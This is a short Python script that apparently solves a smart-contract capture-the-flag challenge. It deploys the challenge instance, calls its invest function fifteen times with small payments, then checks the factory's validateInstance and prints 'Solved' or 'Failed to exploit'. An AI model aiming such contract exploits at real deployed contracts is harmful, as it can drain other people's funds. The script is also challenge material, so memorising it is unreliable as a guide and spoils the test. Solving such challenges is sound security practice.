
from scripts.pwn import *
from scripts.deploy import deploy

def main():
    player = a[0]
    organizer = a[0]

    (player, factory, instance) = deploy(player, organizer)

    accounts.default = player
    assert factory.validateInstance(instance.address, player.address).return_value == False

    # player.transfer(instance.address, to_wei(3, "gwei"))
    for i in range(15):
        instance.invest({'from': player.address, 'value': to_wei(1, "gwei")})

    if factory.validateInstance(instance.address, player.address).return_value:
        # NOTE. don't modify this string
        print("[!] Solved")
    else:
        print("[!] Failed to exploit")
